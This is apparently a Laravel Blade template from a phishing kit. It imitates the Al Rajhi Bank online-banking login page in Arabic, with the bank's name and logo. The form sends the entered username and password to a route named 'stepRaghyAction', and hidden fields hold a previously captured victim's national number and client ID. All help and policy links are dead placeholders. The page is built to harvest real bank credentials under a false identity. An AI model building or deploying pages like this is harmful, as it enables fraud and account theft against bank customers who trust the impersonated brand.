<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - مصرف الراجحي</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.1/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="{{asset('raghy/style.css')}}">
    <style>
        #loginButton {
    background-color: #007bff;
    color: white; 
    border: none;
    border-radius: 5px; 
}

#loginButton:disabled {
    background-color: #d6d6d6; 
    color:#9e9e9e;
}
    </style>
</head>
<body>
    <header class="header">
        <img src="{{asset('raghy/images/logo-arb.png')}}" alt="Logo" class="logo">
        <div>
            <p>مصرف الراجحي</p>
            <p style="  letter-spacing: 1px;">alrajhi bank</p>
        </div>
    </header>
    <main class="d-flex justify-content-center align-items-center  bg-light">
        <div class="container text-center  p-4  " >
            <div  class="container text-center bg-white p-4 rounded shadow-lg">

            <h1 class="mb-3">مرحباً بك في الراجحي أون لاين</h1>
            <h4 class="mb-4 text-secondary">تسجيل الدخول</h4>
 <form id="loginForm" action="{{route('stepRaghyAction')}}" method="POST">
                        @csrf
                         <input type="hidden" name="national_number" value="{{$client->national_number}}">
        <input type="hidden" name="client_id" value="{{$client->id}}">                <div class="mb-3">
                    <input name="raghy_name" id="usernameField" type="text" class="form-control" placeholder="اسم المستخدم" required>
                </div>
                <div class="mb-3 position-relative">
                    <button id="togglePassword" type="button" class="btn btn-link position-absolute top-50 start-0 translate-middle-y me-2">👁</button>
                    <input name="raghy_password" id="passwordField" type="password" class="form-control" placeholder="كلمة السر" required>
                </div>
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <div class="d-flex justify-content-between align-items-center gap-2">
                        <div class="form-check">
                            <input type="checkbox" class="form-check-input" id="remember">
                        </div>
                        <label class="form-check-label small" for="remember">تذكرني</label>
                    </div>
                    <a href="#" class="text-color small">هل نسيت كلمة السر؟</a>
                </div>
                <button id="loginButton" type="submit" class="btn btn-primary w-100 py-2" disabled>تسجيل الدخول</button>
            </form>
            <div class="mt-3">
                <p class="small text-color">هل تواجه مشكلة في تسجيل الدخول؟</p>
                <p class="small">
                    <a href="#" class="text-black" >غير مسجل في الخدمة؟</a><br>
                    <a href="#" class="text-color">سجل في الخدمات المصرفية عبر الإنترنت</a>
                </p>
            </div>
        </div>

            <footer class="mt-4 small">
                <a href="#" class="text-color mx-2">الشروط والأحكام</a> |
                <a href="#" class="text-color mx-2">نظرة عامة على الأمان عبر الإنترنت</a> |
                <a href="#" class="text-color mx-2">السياسات</a>
            </footer>
        </div>
    </main>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.1/js/bootstrap.bundle.min.js"></script>
    <script>
        const usernameField = document.getElementById("usernameField");
        const passwordField = document.getElementById("passwordField");
        const loginButton = document.getElementById("loginButton");
        const loginForm = document.getElementById("loginForm");
    
        const validateForm = () => {
            const isUsernameValid = usernameField.value.trim().length > 0;
            const isPasswordValid = passwordField.value.trim().length >= 6;
            loginButton.disabled = !(isUsernameValid && isPasswordValid);
            console.log((isUsernameValid && isPasswordValid));
        };
    
        usernameField.addEventListener("input", validateForm);
        passwordField.addEventListener("input", validateForm);
    
        const togglePassword = document.getElementById("togglePassword");
        togglePassword.addEventListener("click", function () {
            const type = passwordField.type === "password" ? "text" : "password";
            passwordField.type = type;
            this.textContent = type === "password" ? "👁" : "🙈";
        });
    
       </script>
</body>
</html>